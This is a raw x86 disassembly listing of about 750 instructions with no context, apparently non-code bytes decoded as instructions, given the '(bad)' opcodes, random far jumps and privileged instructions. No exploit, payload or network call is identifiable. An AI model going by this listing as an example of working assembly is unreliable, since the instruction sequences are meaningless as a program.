  43ff2a:	mov    dl,0xf7
  43ff2c:	add    edx,DWORD PTR ds:0xe7872f74
  43ff32:	data16 xor cl,bl
  43ff35:	scas   eax,DWORD PTR es:[edi]
  43ff36:	pop    edi
  43ff37:	dec    BYTE PTR [esi+0x3f796f3]
  43ff3d:	nop
  43ff3e:	mov    dl,0x74
  43ff40:	push   ds
  43ff41:	test   BYTE PTR [edx-0x49417838],dh
  43ff47:	test   DWORD PTR [ebx],0x9cf62489
  43ff4d:	fcmovu st,st(6)
  43ff4f:	ins    BYTE PTR es:[edi],dx
  43ff50:	int    0x54
  43ff52:	shl    BYTE PTR ds:0x5eaa5181,cl
  43ff58:	ss pop eax
  43ff5a:	scas   eax,DWORD PTR es:[edi]
  43ff5b:	scas   eax,DWORD PTR es:[edi]
  43ff5c:	fadd   st,st(0)
  43ff5e:	push   0xffffffe5
  43ff60:	mov    ebp,0x5c2f6b0c
  43ff65:	ds fcomi st,st(7)
  43ff68:	add    eax,DWORD PTR [ebp-0x2e]
  43ff6b:	cld    
  43ff6c:	xchg   edx,eax
  43ff6d:	add    BYTE PTR [eax],al
  43ff6f:	add    BYTE PTR [eax],al
  43ff71:	add    bh,dl
  43ff73:	(bad)  
  43ff74:	xor    al,0x2
  43ff76:	shl    DWORD PTR [edx+0x24],1
  43ff79:	test   al,0x1e
  43ff7b:	sub    al,0x3c
  43ff7d:	clc    
  43ff7e:	pop    ss
  43ff7f:	fistp  DWORD PTR [esp+ecx*2+0x50]
  43ff83:	sub    DWORD PTR [ecx-0x35],esi
  43ff86:	pushf  
  43ff87:	mov    dl,0xf7
  43ff89:	les    edx,FWORD PTR [eax-0x6ffc083c]
  43ff8f:	daa    
  43ff90:	mov    ecx,0xf7b1283b
  43ff95:	add    edx,DWORD PTR [eax+0x7d4b17ff]
  43ff9b:	out    dx,eax
  43ff9c:	pop    esp
  43ff9d:	retf   
  43ff9e:	or     al,0x73
  43ffa0:	xchg   DWORD PTR [eax+0x620f2a93],ecx
  43ffa6:	fistp  DWORD PTR [ebx]
  43ffa8:	clc    
  43ffa9:	loope  0x43ff37
  43ffab:	and    al,bl
  43ffad:	jo     0x440000
  43ffaf:	out    0x25,al
  43ffb1:	scas   eax,DWORD PTR es:[edi]
  43ffb2:	xor    BYTE PTR [edx+0x7e],0x6a
  43ffb6:	mov    esi,ebx
  43ffb8:	push   cs
  43ffb9:	ficomp WORD PTR [edi]
  43ffbb:	in     al,dx
  43ffbc:	or     eax,0xa0a993e9
  43ffc1:	jmp    0x43ffed
  43ffc3:	ins    DWORD PTR es:[edi],dx
  43ffc4:	jmp    0xcb62:0xeee75a62
  43ffcb:	jp     0x440019
  43ffcd:	push   0x52
  43ffcf:	mov    dl,0xd
  43ffd1:	ror    esp,0xd8
  43ffd4:	jmp    0x4400c2
  43ffd9:	add    BYTE PTR [eax],al
  43ffdb:	xchg   ebx,eax
  43ffdc:	out    0xee,eax
  43ffde:	(bad)  
  43ffdf:	retf   
  43ffe0:	adc    BYTE PTR [edi+0x2d71f41c],0xaa
  43ffe7:	pop    ds
  43ffe8:	mov    dh,0x8f
  43ffea:	bound  edx,QWORD PTR [ecx+ebx*1-0x8]
  43ffee:	loope  0x43ff7a
  43fff0:	and    al,0xd8
  43fff2:	jo     0x43ffc5
  43fff4:	fisub  WORD PTR ds:0xb719832f
  43fffa:	pop    ecx
  43fffb:	fwait
  43fffc:	xor    eax,0xb293e99f
  440001:	xchg   ebp,eax
  440002:	xor    DWORD PTR [ebp-0x2f],ecx
  440005:	push   ss
  440006:	jo     0x440061
  440008:	(bad)  
  440009:	sbb    DWORD PTR [edi-0x2b],edi
  44000c:	xor    BYTE PTR [ebp+eax*2-0x75],bl
  440010:	and    al,0xd7
  440012:	jmp    0x2227:0xa497ce48
  440019:	adc    cl,ch
  44001b:	xchg   ebx,eax
  44001c:	mov    dl,0xbd
  44001e:	or     DWORD PTR [edi],ecx
  440020:	ins    DWORD PTR es:[edi],dx
  440021:	repnz add BYTE PTR [ecx],ah
  440024:	shr    DWORD PTR [edx+0x5529a1d3],1
  44002a:	hlt    
  44002b:	js     0x440034
  44002d:	sbb    al,BYTE PTR [ebx]
  44002f:	push   0x668bd229
  440034:	sahf   
  440035:	xchg   ebx,eax
  440036:	add    al,0x21
  440038:	lods   al,BYTE PTR ds:[esi]
  440039:	pushf  
  44003a:	dec    ebp
  44003b:	in     eax,0x26
  44003d:	dec    ebp
  44003e:	hlt    
  44003f:	add    BYTE PTR [eax],al
  440041:	add    BYTE PTR [eax],al
  440043:	add    al,ch
  440045:	or     eax,0xf5170f12
  44004a:	jmp    0xfa56:0x5ff492c0
  440051:	mov    edx,0x595e00ea
  440056:	sub    BYTE PTR [ebx],al
  440058:	imul   esi,DWORD PTR [ebp+0x287bb617],0x2819d3d8
  440062:	push   ebp
  440063:	fmul   QWORD PTR [esi]
  440065:	push   0xffffffea
  440067:	inc    edx
  440068:	push   0x1d
  44006a:	pop    ss
  44006b:	mov    dh,0xf4
  44006d:	and    eax,0x832ee44d
  440072:	rol    BYTE PTR [ebx],1
  440074:	icebp  
  440075:	jl     0x44005f
  440077:	jmp    FWORD PTR [ecx]
  440079:	mov    ch,0xdb
  44007b:	loopne 0x44001f
  44007d:	push   0xfffffff2
  44007f:	xor    DWORD PTR [edi-0x53],0xffffff91
  440083:	push   ebp
  440084:	shr    DWORD PTR [ebp+0xb],0xc3
  440088:	jp     0x440097
  44008a:	pop    ss
  44008b:	mov    bh,0x3c
  44008d:	sbb    ebp,ebx
  44008f:	shl    BYTE PTR [edx+0x6c],0x3e
  440093:	mov    esi,ebp
  440095:	sub    eax,0xee954591
  44009a:	icebp  
  44009b:	or     dh,bh
  44009d:	sub    BYTE PTR [ecx-0x75f96ffd],0x34
  4400a4:	(bad)  
  4400a5:	aas    
  4400a6:	jl     0x4400b0
  4400a8:	add    BYTE PTR [eax],al
  4400aa:	add    BYTE PTR [eax],al
  4400ac:	add    BYTE PTR [esi],bl
  4400ae:	push   ds
  4400af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4400b0:	test   BYTE PTR [ebp-0x21],dl
  4400b3:	mov    ds:0xdda7be4,eax
  4400b8:	mov    esp,edx
  4400ba:	add    ecx,DWORD PTR [esi]
  4400bc:	add    BYTE PTR [ebx],cl
  4400be:	and    ecx,esi
  4400c0:	out    0x98,al
  4400c2:	enter  0xc63f,0x91
  4400c6:	push   eax
  4400c7:	into   
  4400c8:	adc    al,0x90
  4400ca:	retf   
  4400cb:	mov    ds:0x961a6be4,al
  4400d0:	dec    edx
  4400d1:	je     0x440115
  4400d3:	push   ebx
  4400d4:	je     0x44006d
  4400d6:	push   esp
  4400d7:	sub    DWORD PTR [eax],ecx
  4400d9:	push   edi
  4400da:	mov    ch,dl
  4400dc:	fcmovnb st,st(6)
  4400de:	mov    DWORD PTR [edx],edx
  4400e0:	out    0xc8,eax
  4400e2:	retf   
  4400e3:	or     eax,0x18121b00
  4400e8:	mov    dl,0x50
  4400ea:	or     esi,DWORD PTR [esi+0x182a130f]
  4400f0:	xchg   edi,ebx
  4400f2:	lea    edx,[ebp+0x1008d840]
  4400f8:	adc    DWORD PTR [eax-0x307af237],edx
  4400fe:	and    DWORD PTR [ecx-0x41],ebp
  440101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440102:	or     ebx,ecx
  440104:	out    dx,eax
  440105:	mov    ds:0x1c7a93ab,eax
  44010a:	retf   0x8416
  44010d:	add    ah,cl
  44010f:	or     eax,0x0
  440114:	add    BYTE PTR [eax],al
  440116:	lahf   
  440117:	pop    edi
  440118:	adc    cl,bh
  44011a:	push   ebp
  44011b:	popf   
  44011c:	fwait
  44011d:	leave  
  44011e:	jecxz  0x440189
  440120:	push   eax
  440121:	jge    0x4400f1
  440123:	mov    dl,0xdf
  440125:	mov    al,BYTE PTR [edx-0x26]
  440128:	hlt    
  440129:	mov    ebx,0x15af5f9c
  44012e:	mov    edx,0x184b892b
  440133:	mov    dl,0xf7
  440135:	add    edx,DWORD PTR [eax-0x4912e7fd]
  44013b:	push   0xffffffd4
  44013d:	les    edi,FWORD PTR [esi-0x534b4c90]
  440143:	mov    cl,0x60
  440145:	mov    edi,0xc0f7b284
  44014a:	nop
  44014b:	mov    edx,0x339003f7
  440150:	pop    ebx
  440151:	xchg   esp,eax
  440152:	xchg   edi,eax
  440153:	test   al,0x7b
  440155:	dec    ecx
  440156:	mov    ss,edi
  440158:	test   DWORD PTR [edx+ebx*8-0x7fb8f32e],0xbd40312b
  440163:	icebp  
  440164:	or     DWORD PTR [ebx-0x4b],ecx
  440167:	icebp  
  440168:	pop    esi
  440169:	ds pop esp
  44016b:	fwait
  44016c:	cmp    al,ch
  44016e:	loope  0x440115
  440170:	je     0x4401ca
  440172:	pop    ss
  440173:	mov    ebx,0xa79003f7
  440178:	jb     0x4401d1
  44017a:	add    BYTE PTR [eax],al
  44017c:	add    BYTE PTR [eax],al
  44017e:	add    BYTE PTR [esi-0x29],al
  440181:	test   DWORD PTR [eax+ecx*8-0x3e3d635e],0x14c2fca7
  44018c:	add    eax,DWORD PTR [di]
  44018f:	(bad)  [edx-0x74dbc192]
  440195:	das    
  440196:	lods   al,BYTE PTR ds:[esi]
  440197:	mov    WORD PTR [ebx],gs
  440199:	mov    eax,ds:0xf4eab4cf
  44019e:	dec    eax
  44019f:	shr    BYTE PTR [ebx],0xf
  4401a2:	lods   al,BYTE PTR ds:[esi]
  4401a3:	wrmsr  
  4401a5:	pop    esp
  4401a6:	adc    eax,0x704e6a04
  4401ab:	push   esi
  4401ac:	mul    BYTE PTR ds:0x95c38128
  4401b2:	sub    BYTE PTR [ecx+ebp*4],ch
  4401b5:	xchg   ebp,eax
  4401b6:	pushf  
  4401b7:	sub    ecx,DWORD PTR [esi+0x725072d6]
  4401bd:	xchg   edi,eax
  4401be:	lods   al,BYTE PTR ds:[esi]
  4401bf:	imul   DWORD PTR [edi]
  4401c1:	push   esp
  4401c2:	adc    eax,0x62e2740a
  4401c7:	dec    esi
  4401c8:	loop   0x4401ef
  4401ca:	test   al,0x9e
  4401cc:	mov    bl,0x95
  4401ce:	test   al,0x15
  4401d0:	je     0x4401b4
  4401d2:	add    cl,ah
  4401d4:	das    
  4401d5:	pop    esp
  4401d6:	(bad)  [ebx]
  4401d8:	ins    BYTE PTR es:[edi],dx
  4401d9:	retf   0x5c12
  4401dc:	das    
  4401dd:	push   esp
  4401de:	rcl    DWORD PTR ds:0x624e6b,1
  4401e4:	add    BYTE PTR [eax],al
  4401e6:	add    BYTE PTR [eax],al
  4401e8:	leave  
  4401e9:	(bad)  
  4401ea:	xor    eax,0x5c2d241c
  4401ef:	mov    ebp,0xeaf5ae3b
  4401f4:	sbb    BYTE PTR [ebp+0xe],ch
  4401f7:	(bad)  
  4401f8:	leave  
  4401f9:	(bad)  
  4401fa:	xchg   esp,eax
  4401fb:	fisttp QWORD PTR [edi+ebp*1-0x51e36eac]
  440202:	dec    esi
  440203:	jle    0x4401de
  440205:	ficom  WORD PTR [edi-0x59f13d4]
  44020b:	push   0xffffff9f
  44020d:	jb     0x44021d
  44020f:	not    BYTE PTR [eax]
  440211:	fwait
  440212:	psubsw mm2,QWORD PTR [ebx-0x6c02ee0d]
  440219:	mov    dl,0xe
  44021b:	inc    eax
  44021c:	inc    eax
  44021d:	aad    0xe9
  44021f:	add    cl,bh
  440221:	xor    BYTE PTR [ebp-0x10],ah
  440224:	stc    
  440225:	lods   al,BYTE PTR ds:[esi]
  440226:	xchg   edx,eax
  440227:	mov    al,ch
  440229:	mov    cl,0xe
  44022b:	mov    ebp,DWORD PTR [edx+ecx*1]
  44022e:	xchg   esp,eax
  44022f:	dec    edi
  440230:	cmp    DWORD PTR [edx],ebp
  440232:	adc    al,BYTE PTR [eax-0x7a]
  440235:	imul   ebx,esi,0xffffff89
  440238:	sub    al,0xa
  44023a:	iret   
  44023b:	pop    es
  44023c:	fnsave [ecx-0x215ffff2]
  440242:	call   0x6774bc46
  440247:	or     BYTE PTR [ecx+0xb092ac],ch
  44024d:	add    BYTE PTR [eax],al
  44024f:	add    BYTE PTR [eax],al
  440251:	test   eax,0xb7830eb1
  440256:	sar    DWORD PTR [edx+0x26],1
  440259:	xor    al,0xb5
  44025b:	xor    al,BYTE PTR [eax]
  44025d:	sub    bh,BYTE PTR [edx+0x55b600ea]
  440263:	pop    eax
  440264:	add    DWORD PTR [ecx-0x4f],edi
  440267:	pop    ss
  440268:	mov    dh,0x7b
  44026a:	cmp    al,0x55
  44026c:	cld    
  44026d:	repnz out dx,eax
  44026f:	(bad)  
  440271:	stos   DWORD PTR es:[edi],eax
  440272:	xor    eax,edx
  440274:	or     al,ah
  440276:	mov    ds:0x305103e6,al
  44027b:	call   0x93607da0
  440280:	inc    ebp
  440281:	or     eax,ecx
  440283:	dec    esp
  440284:	lock ret 0x166a
  440288:	add    DWORD PTR [eax-0x1e],edi
  44028b:	call   0x4d6a67d6
  440290:	loopne 0x44023e
  440292:	icebp  
  440293:	pop    ebp
  440294:	sub    DWORD PTR [edx-0x21740996],esp
  44029a:	fcomp  DWORD PTR [ecx+0x2b]
  44029d:	nop
  44029e:	xchg   ebx,eax
  44029f:	mov    WORD PTR [eax-0x80],?
  4402a2:	retf   
  4402a3:	and    cl,BYTE PTR [esi-0x7c]
  4402a6:	les    esi,FWORD PTR [ebp+0xdcbc69d]
  4402ac:	in     eax,0x95
  4402ae:	jae    0x4402e4
  4402b0:	aaa    
  4402b1:	nop
  4402b2:	retf   
  4402b3:	xchg   esp,eax
  4402b4:	dec    edx
  4402b5:	add    BYTE PTR [eax],al
  4402b7:	add    BYTE PTR [eax],al
  4402b9:	add    BYTE PTR [eax+0x19f81e60],bl
  4402bf:	or     al,0xe6
  4402c1:	xchg   BYTE PTR [ecx-0x5],dl
  4402c4:	mov    WORD PTR [eax-0x80],?
  4402c7:	retf   
  4402c8:	xchg   esp,eax
  4402c9:	inc    edx
  4402ca:	shl    BYTE PTR [ecx+0x4e],0xe0
  4402ce:	sbb    ecx,DWORD PTR [eax-0x348ae302]
  4402d4:	cmp    bh,0xb7
  4402d7:	dec    edi
  4402d8:	aam    0xbe
  4402da:	mov    cl,0xda
  4402dc:	push   cs
  4402dd:	mov    edi,0xe6ce201b
  4402e2:	mov    BYTE PTR [edx-0x53],cl
  4402e5:	call   DWORD PTR [esi+0x70bf0dca]
  4402eb:	loop   0x4402fb
  4402ed:	mov    edi,0xe6ce211b
  4402f2:	cwde   
  4402f3:	enter  0x34cc,0xcf
  4402f7:	add    DWORD PTR [edx],ebx
  4402f9:	or     al,0x1b
  4402fb:	xchg   DWORD PTR [edx],ebx
  4402fd:	rcl    eax,0xb1
  440300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440301:	dec    ecx
  440302:	ror    cl,1
  440304:	mov    dh,0x53
  440306:	mov    ds:0x57f1c020,eax
  44030b:	(bad)
  44030e:	inc    edi
  44030f:	retf   0x788e
  440312:	mov    cl,cl
  440314:	adc    al,BYTE PTR [esi+eax*1+0x13000dca]
  44031b:	mov    bl,0xf0
  44031d:	repz add BYTE PTR [eax],al
  440320:	add    BYTE PTR [eax],al
  440322:	add    BYTE PTR [edi],ah
  440324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440325:	jae    0x4402a7
  440327:	pop    ds
  440328:	aam    0xf7
  44032a:	sbb    BYTE PTR [ecx],0x93
  44032d:	vandnps ymm2,ymm6,YMMWORD PTR [ebx+0x4]
  440333:	cdq    
  440334:	cs pop ebp
  440336:	add    al,0x90
  440338:	mov    dl,0xf0
  44033a:	dec    ebp
  44033b:	cmc    
  44033c:	aam    0x8a
  44033e:	xchg   edi,eax
  44033f:	adc    al,0xe5
  440341:	and    al,0xa4
  440343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440344:	das    
  440345:	xor    cl,BYTE PTR [edi+edx*1]
  440348:	jle    0x440349
  44034a:	add    BYTE PTR [eax+0x3de41a2f],bh
  440350:	hlt    
  440351:	int3   
  440352:	xor    al,0xa4
  440354:	pop    esi
  440355:	or     DWORD PTR [eax+0x4338aa4a],0xffffff98
  44035c:	test   BYTE PTR [ecx-0x7146fbd],0xf6
  440363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440364:	shl    edi,cl
  440366:	mov    BYTE PTR [eax-0x770a3fd1],dl
  44036c:	sub    al,0x18
  44036e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44036f:	mov    bl,dl
  440371:	(bad)  
  440372:	xchg   ebp,eax
  440373:	mov    bl,dl
  440375:	test   al,0x35
  440377:	in     eax,0x73
  440379:	ins    BYTE PTR es:[edi],dx
  44037a:	sahf   
  44037b:	(bad)  
  44037d:	out    dx,eax
  44037e:	add    edx,DWORD PTR ds:0xda88df6d
  440384:	retf   0x4b5e
  440387:	add    BYTE PTR [eax],al
  440389:	add    BYTE PTR [eax],al
  44038b:	add    BYTE PTR [edi+eiz*1-0x3df16bcd],cl
  440392:	ins    BYTE PTR es:[edi],dx
  440393:	cs dec esp
  440395:	sub    DWORD PTR [eax],esp
  440397:	hlt    
  440398:	push   cs
  440399:	xor    bl,0x8a
  44039c:	rcl    BYTE PTR [esi+0x7a0b170e],0x26
  4403a3:	adc    cl,ah
  4403a5:	aad    0xe9
  4403a7:	jmp    0x44d97d3f
  4403ac:	data16 adc al,0x17
  4403af:	jmp    0x576201f4
  4403b4:	dec    esp
  4403b5:	mov    dl,0xa
  4403b7:	jmp    0xa515b64f
  4403bc:	cmp    edx,esp
  4403be:	jmp    0x121197ac
  4403c3:	es scas al,BYTE PTR es:[edi]
  4403c5:	cli    
  4403c6:	jmp    0x4403ee
  4403c8:	cld    
  4403c9:	fst    DWORD PTR [ebp+0x5c2d8ba4]
  4403cf:	add    DWORD PTR [edx],ecx
  4403d1:	imul   ebx,DWORD PTR [edx],0x62
  4403d4:	push   esi
  4403d5:	loop   0x44036e
  4403d7:	fstp   DWORD PTR [eax]
  4403d9:	sub    dl,0x70
  4403dc:	dec    ebx
  4403dd:	ret    0x9997
  4403e0:	mov    bh,0x55
  4403e2:	imul   eax,ecx,0x214a2b93
  4403e8:	and    eax,0xae542a62
  4403ed:	sub    eax,0xc95c
  4403f2:	add    BYTE PTR [eax],al
  4403f4:	add    bh,al
  4403f6:	push   0xfffffffe
  4403f8:	push   esp
  4403f9:	imul   esi,DWORD PTR [edi],0xad146a12
  4403ff:	imul   ecx,DWORD PTR [edi],0x17
  440402:	retf   0x3504
  440405:	mov    cl,BYTE PTR [edi+0x6b]
  440408:	fst    QWORD PTR [edi-0x268dd2ba]
  44040e:	rcl    BYTE PTR [ebp+0x1bda5c3c],cl
  440414:	test   DWORD PTR [ebx],eax
  440416:	retf   
  440417:	xchg   ebx,eax
  440418:	test   eax,0xd1a6a8
  44041d:	ss (bad) 
  44041f:	jmp    0x43c82e23
  440424:	mov    eax,0xffe725bd
  440429:	sahf   
  44042a:	push   ecx
  44042b:	in     al,dx
  44042c:	pop    ebp
  44042d:	jnp    0x4403fd
  44042f:	jmp    0x931248be
  440434:	inc    ebp
  440435:	pop    ecx
  440436:	icebp  
  440437:	dec    edi
  440438:	add    al,0x72
  44043a:	sub    esi,0x2b
  44043d:	das    
  44043e:	(bad)  
  44043f:	call   0x44fb0589
  440444:	adc    al,0xe8
  440446:	test   BYTE PTR [edx],cl
  440448:	cmp    DWORD PTR [esi],0xffffffce
  44044b:	jmp    0x5e4a38d8
  440450:	xor    DWORD PTR [ecx+eiz*1+0x5e],esi
  440454:	sub    eax,0xfffea56a
  440459:	add    BYTE PTR [eax],al
  44045b:	add    BYTE PTR [eax],al
  44045d:	add    BYTE PTR [edx],cl
  44045f:	stos   BYTE PTR es:[edi],al
  440460:	sbb    DWORD PTR [ebx+0x4792d227],ecx
  440466:	mov    cl,0xf0
  440468:	ficom  DWORD PTR [edx+0x19]
  44046b:	cs in  al,0x3c
  44046e:	mov    ecx,0x220ff3b5
  440473:	jae    0x44048f
  440475:	mov    esp,DWORD PTR [esi-0x22]
  440478:	xor    cl,bl
  44047a:	pop    eax
  44047b:	mov    dh,dh
  44047d:	mov    ecx,0x890eb6a6
  440482:	mov    dh,0xde
  440484:	nop
  440485:	inc    esi
  440486:	jns    0x4404d8
  440488:	push   cs
  440489:	add    DWORD PTR [ecx-0x38],0x5d
  44048d:	or     al,0x36
  44048f:	jp     0x4404a7
  440491:	add    BYTE PTR [ecx-0x4b],bh
  440494:	push   cs
  440495:	xor    DWORD PTR [ecx],0xffffffb3
  440498:	pop    ebp
  440499:	pop    es
  44049a:	nop
  44049b:	and    BYTE PTR [edi+0x8],dl
  44049e:	nop
  44049f:	fimul  DWORD PTR ds:0x16881b00
  4404a5:	icebp  
  4404a6:	pop    ecx
  4404a7:	aam    0xaa
  4404a9:	sub    al,0x62
  4404ab:	pop    esp
  4404ac:	mov    dl,0x3f
  4404ae:	adc    eax,DWORD PTR [ebx-0x18]
  4404b1:	or     ch,bh
  4404b3:	pushf  
  4404b4:	adc    BYTE PTR [ebx-0x78],cl
  4404b7:	add    eax,0xdb10dd93
  4404bc:	or     eax,0x108a9300
  4404c1:	push   ecx
  4404c2:	add    BYTE PTR [eax],al
  4404c4:	add    BYTE PTR [eax],al
  4404c6:	add    ah,al
  4404c8:	pop    esp
  4404c9:	dec    bh
  4404cb:	nop
  4404cc:	inc    edx
  4404cd:	daa    
  4404ce:	sub    al,0x7d
  4404d0:	fist   WORD PTR [esi-0x6f269b2c]
  4404d6:	jp     0x44046c
  4404d8:	fild   WORD PTR [esi]
  4404da:	pop    ss
  4404db:	or     edx,DWORD PTR [esi]
  4404dd:	mov    dh,0x82
  4404df:	rcl    bh,1
  4404e1:	xchg   esi,eax
  4404e2:	mov    al,ds:0x597cbfce
  4404e7:	imul   esi,DWORD PTR [ebx-0x68],0xfffffff8
  4404eb:	mov    edi,0xad851fcf
  4404f0:	and    eax,0x549007d4
  4404f5:	push   esi
  4404f6:	fadd   DWORD PTR [esi+0x74]
  4404f9:	pop    ds
  4404fa:	test   DWORD PTR [ebp-0x6ff82f73],esi
  440500:	and    edi,DWORD PTR [ebp-0x8]
  440503:	pop    DWORD PTR [ecx]
  440505:	and    BYTE PTR [ebp+0x7d0976d],al
  44050b:	nop
  44050c:	and    BYTE PTR [edx+0x3c],cl
  44050f:	nop
  440510:	xlat   BYTE PTR ds:[ebx]
  440511:	outs   dx,BYTE PTR ds:[esi]
  440512:	cmp    al,0x90
  440514:	jge    0x440585
  440516:	cmp    al,0x90
  440518:	mov    dl,0xe7
  44051a:	push   ebx
  44051b:	pushf  
  44051c:	mov    dl,0x72
  44051e:	push   esp
  44051f:	xchg   esp,eax
  440520:	mov    dl,0xf4
  440522:	push   edx
  440523:	mov    WORD PTR [edx-0x4d7bacbd],?
  440529:	adc    al,0x56
  44052b:	add    BYTE PTR [eax],al
  44052d:	add    BYTE PTR [eax],al
  44052f:	add    BYTE PTR [edx+esi*4-0x5],bh
  440533:	push   esp
  440534:	je     0x4404e8
  440536:	inc    esi
  440537:	push   ebp
  440538:	ins    BYTE PTR es:[edi],dx
  440539:	mov    dl,0x69
  44053b:	push   ebp
  44053c:	fs mov dl,0xea
  44053f:	push   edi
  440540:	pop    esp
  440541:	mov    dl,0xfe
  440543:	push   edi
  440544:	push   esp
  440545:	mov    dl,0x4f
  440547:	pop    eax
  440548:	int3   
  440549:	mov    dl,0xb2
  44054b:	push   esi
  44054c:	les    esi,FWORD PTR [edx-0x4d43a964]
  440552:	nop
  440553:	push   edi
  440554:	mov    ah,0xb2
  440556:	adc    al,0x5a
  440558:	lods   al,BYTE PTR ds:[esi]
  440559:	mov    dl,0x26
  44055b:	pop    edx
  44055c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44055d:	mov    dl,0x79
  44055f:	dec    ebx
  440560:	pushf  
  440561:	mov    dl,0x7b
  440563:	dec    ebx
  440564:	xchg   esp,eax
  440565:	mov    dl,0x61
  440567:	dec    ebp
  440568:	mov    WORD PTR [edx-0x4d7bb304],?
  44056e:	mov    DWORD PTR [esi+0x7c],ecx
  440571:	mov    dl,0x54
  440573:	dec    edi
  440574:	je     0x440528
  440576:	mov    ss,WORD PTR [ecx+0x6c]
  440579:	mov    dl,0x4a
  44057b:	push   edx
  44057c:	fs mov dl,0x22
  44057f:	push   ecx
  440580:	pop    esp
  440581:	mov    dl,0xbc
  440583:	push   eax
  440584:	push   esp
  440585:	mov    dl,0xcb
  440587:	push   eax
  440588:	int3   
  440589:	mov    dl,0xa
  44058b:	(bad)  
  44058c:	les    esi,FWORD PTR [edx-0x4d43a89e]
  440592:	dec    ecx
  440593:	push   edi
  440594:	add    BYTE PTR [eax],al
  440596:	add    BYTE PTR [eax],al
  440598:	add    BYTE PTR [edx+esi*4-0x71388af2],dh
  44059f:	push   cs
  4405a0:	pushf  
  4405a1:	mov    edi,0x1fb50e8e
  4405a6:	sti    
  4405a7:	fisubr DWORD PTR [ebp+0x3cdafb17]
  4405ad:	int    0xdb
  4405af:	inc    eax
  4405b0:	bound  ebx,QWORD PTR [esi-0x58806c46]
  4405b6:	mov    edx,DWORD PTR [ebp-0x30cbbfd9]
  4405bc:	std    
  4405bd:	dec    ecx
  4405be:	ss pop ecx
  4405c0:	lds    ecx,FWORD PTR [esi]
  4405c2:	clc    
  4405c3:	bound  edx,QWORD PTR [esi]
  4405c5:	popf   
  4405c6:	(bad)  
  4405c7:	and    ah,BYTE PTR [ebx+edx*2+0x43]
  4405cb:	adc    al,0xb9
  4405cd:	mov    WORD PTR [ecx+0x36],?
  4405d0:	mov    ecx,0x2d8e0020
  4405d5:	sti    
  4405d6:	xor    eax,0x6174dd59
  4405db:	bound  ebx,QWORD PTR ss:[ecx-0x6a]
  4405df:	aas    
  4405e0:	fwait
  4405e1:	add    bh,bh
  4405e3:	lea    ebp,ds:0xfd50f1db
  4405e9:	xchg   ebx,eax
  4405ea:	mov    dl,0xe
  4405ec:	jmp    0xac8d14d5
  4405f1:	int    0xb2
  4405f3:	push   cs
  4405f4:	inc    ecx
  4405f5:	and    edx,ecx
  4405f7:	jmp    0xccaf86fa
  4405fc:	in     eax,dx
  4405fd:	add    BYTE PTR [eax],al
  4405ff:	add    BYTE PTR [eax],al
  440601:	add    BYTE PTR [ebx-0x18e22502],dl
  440607:	cli    
  440608:	fidiv  DWORD PTR [ebp-0x52250530]
  44060e:	sar    dl,1
  440610:	fidivr DWORD PTR [ebx+ecx*1]
  440613:	fidivr DWORD PTR [edi]
  440615:	(bad)  
  440616:	(bad)  
  440617:	scas   al,BYTE PTR es:[edi]
  440618:	xchg   ebp,eax
  440619:	add    BYTE PTR [edi-0x1bfe8f46],bl
  44061f:	jnp    0x440608
  440621:	push   eax
  440622:	mov    es,WORD PTR [edi-0x5052d19]
  440628:	sbb    DWORD PTR [ebx+0xf5db831],eax
  44062e:	pushw  0xff4c
  440632:	mov    dl,0x73
  440634:	push   ss
  440635:	mov    DWORD PTR [eax],edi
  440637:	loope  0x4405e2
  440639:	mov    ecx,DWORD PTR [esp+eax*4]
  44063c:	stos   DWORD PTR es:[edi],eax
  44063d:	mov    ebx,DWORD PTR [edi+0x414692c2]
  440643:	test   DWORD PTR [eax-0x1],ebx
  440646:	or     DWORD PTR [edx],esi
  440648:	into   
  440649:	or     BYTE PTR [esi-0x5d3ffce2],bh
  44064f:	sbb    eax,DWORD PTR [ebp-0x3d]
  440652:	dec    esp
  440653:	dec    ecx
  440654:	cmc    
  440655:	push   ecx
  440656:	dec    edx
  440657:	mov    BYTE PTR [edi],bh
  440659:	mov    edx,DWORD PTR [ecx+0x33]
  44065c:	dec    ebp
  44065d:	cld    
  44065e:	and    BYTE PTR [edi],0x5a
  440661:	(bad)  
  440662:	cmp    al,0x3e
  440664:	jmp    0x0:0xff
  44066b:	stc    
  44066c:	mov    cl,0xf6
  44066e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44066f:	mov    dh,0x3d
  440671:	out    0x8b,eax
  440673:	adc    al,0x3e
  440675:	imul   eax,esp,0xffffffbd
  440678:	cmp    ch,BYTE PTR [edx+0x5532cd75]
  44067e:	cld    
  44067f:	sbb    BYTE PTR [edx],ch
  440681:	pushf  
  440682:	push   DWORD PTR [esi-0x423b94c4]
  440688:	cmp    ch,BYTE PTR [edx+0x3c48bd75]
  44068e:	cld    
  44068f:	and    dh,BYTE PTR [edx+0x16]
  440692:	pop    edi
  440693:	call   0x904f18ab
  440698:	or     BYTE PTR [edi+eax*4],bh
  44069b:	mov    eax,ds:0xdde26580
  4406a0:	sbb    BYTE PTR [ebp+0x52],ah
  4406a3:	mov    BYTE PTR [eax+edi*1+0xddb92c1],ch
  4406aa:	add    BYTE PTR [eax-0x421d9a60],dl
  4406b0:	sbb    BYTE PTR [edx-0x55e0bb35],ch
  4406b6:	retf   
  4406b7:	pop    esp
  4406b8:	mov    fs,WORD PTR [ebp-0x15]
  4406bb:	loope  0x440645
  4406bd:	and    BYTE PTR [ecx+0xb],dl
  4406c0:	xor    ecx,DWORD PTR [edi-0x7dbfcbbe]
  4406c6:	dec    edi
  4406c7:	push   edi
  4406c8:	sahf   
  4406c9:	jle    0x4406ca
  4406cb:	daa    
  4406cc:	fisttp DWORD PTR ds:0xe8
  4406d2:	add    BYTE PTR [eax],al
  4406d4:	aad    0x54
  4406d6:	cwde   
  4406d7:	clc    
  4406d8:	or     ebx,DWORD PTR [esi]
  4406da:	call   0xdd6:0x64ded47c
  4406e1:	fwait
  4406e2:	push   es
  4406e3:	or     DWORD PTR ds:0xe84e9a06,ecx
  4406e9:	retf   0xf898
  4406ec:	out    dx,eax
  4406ed:	dec    edi
